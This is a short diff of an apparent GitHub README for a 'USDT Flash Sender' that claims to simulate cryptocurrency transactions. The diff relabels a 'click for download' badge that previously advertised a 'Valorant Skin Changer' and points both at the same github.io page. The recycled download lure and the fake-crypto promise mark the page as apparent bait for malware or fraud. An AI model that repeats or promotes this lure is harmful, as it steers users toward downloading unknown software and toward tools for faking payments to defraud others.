@@ -7,7 +7,7 @@ Need to showcase or test USDT transactions without spending real crypto? The USD
 
 <div style="text-align: center">
   <a href="https://usdt-flash-sender-for-pc.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Valorant_Skin_Changer-blueviolet">
+    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-USDT_FLASH_SENDER-blueviolet">
   </a>
 </div>
 
